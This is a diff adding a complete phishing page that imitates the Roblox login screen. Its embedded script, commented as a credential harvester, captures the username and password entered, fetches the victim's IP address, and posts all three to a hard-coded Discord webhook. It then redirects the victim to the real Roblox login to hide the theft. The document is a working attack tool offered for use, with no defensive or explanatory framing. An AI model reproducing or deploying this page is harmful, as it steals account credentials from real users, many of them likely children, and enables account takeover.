@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ROBLOX Login</title>
+    <style>
+        body { background: #1a1e2c; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
+        .login-box { background: #2a2f45; padding: 30px; border-radius: 12px; width: 320px; }
+        input { width: 100%; padding: 10px; margin: 8px 0; border: none; border-radius: 6px; }
+        button { width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="login-box">
+    <h3>Sign in to ROBLOX</h3>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="steal()">Login</button>
+    <p id="status"></p>
+</div>
+<script>
+    // palofsc: Roblox credential harvester via phishing page
+    // Sends username/password to a Discord webhook
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1512040092540076064/NkvW2MQigN2R8SOA_BUWzScfN0-YLNYlXy1_k5oOftMRsw-lGhYGI49LL2D_-o5-kK8k";  // REPLACE
+
+    async function steal() {
+        let user = document.getElementById("username").value;
+        let pass = document.getElementById("password").value;
+        if (!user || !pass) {
+            document.getElementById("status").innerText = "Fill both fields";
+            return;
+        }
+        let ip = await getIP();
+        let embed = {
+            embeds: [{
+                title: "ROBLOX STOLEN",
+                color: 0xff0000,
+                fields: [
+                    { name: "Username", value: user, inline: true },
+                    { name: "Password", value: pass, inline: true },
+                    { name: "IP", value: ip, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(embed)
+        }).then(() => {
+            window.location.href = "https://www.roblox.com/login";
+        }).catch(() => {
+            window.location.href = "https://www.roblox.com/login";
+        });
+    }
+
+    async function getIP() {
+        try {
+            let res = await fetch("https://api.ipify.org?format=json");
+            let data = await res.json();
+            return data.ip;
+        } catch(e) { return "unknown"; }
+    }
+</script>
+</body>
+</html>
